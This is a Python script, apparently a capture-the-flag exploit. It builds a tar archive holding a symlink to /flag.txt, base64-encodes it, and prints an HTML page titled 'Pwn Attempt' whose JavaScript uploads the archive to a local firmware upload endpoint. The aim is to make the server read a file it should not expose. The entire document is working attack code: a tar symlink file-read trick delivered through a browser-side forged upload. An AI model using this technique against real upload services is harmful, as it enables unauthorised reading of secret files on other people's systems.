import os

commands = """
cd /tmp && mkdir -p /tmp/tar_gen/workdir 
mkdir -p /tmp/tar_gen/app/application/static 
echo 'This proof was generated on' $(date) > /tmp/tar_gen/app/application/static/upload_proof.txt  &&
ln -s /flag.txt /tmp/tar_gen/app/application/static/flag.txt
cd /tmp/tar_gen/workdir
tar -czvf test.tar.gz --absolute-names ../app/application/static/upload_proof.txt ../app/application/static/flag.txt 
cp test.tar.gz /tmp/test.tar.gz
"""
print(os.popen(commands).read())

b64Data = os.popen("cat /tmp/test.tar.gz | base64").read().replace("\n", "")


output = f"""
<h1>Pwn Attempt</h1>
<script>
var b64Data = "{b64Data}";
""" + """

async function sendFile()
{
    var FILENAME = "test.tar.gz"
    
    var ENDPOINT = "http://localhost:1337/api/firmware/upload";
    
    /// Upload file from b64 //////////////////////////
    const byteCharacters = atob(b64Data);
    const byteNumbers = new Array(byteCharacters.length);
    for (let i = 0; i < byteCharacters.length; i++) {
        byteNumbers[i] = byteCharacters.charCodeAt(i);
    }
    const byteArray = new Uint8Array(byteNumbers);
    var blob = new Blob([byteArray], { type: "text/html"});
    
    /*
    var URL = "http://localhost:8000/" + FILENAME;
    let blob = await fetch(URL).then(r => r.blob());
    */
    
    /// Uploading ////////////////////////////////////////////
    var formData = new FormData();
    formData.append("file", blob, FILENAME);
    var request = new XMLHttpRequest();
    request.open("POST", ENDPOINT);
    request.send(formData);
    
}
sendFile()
</script>
"""

print("### Payload #########################################")
print(output)
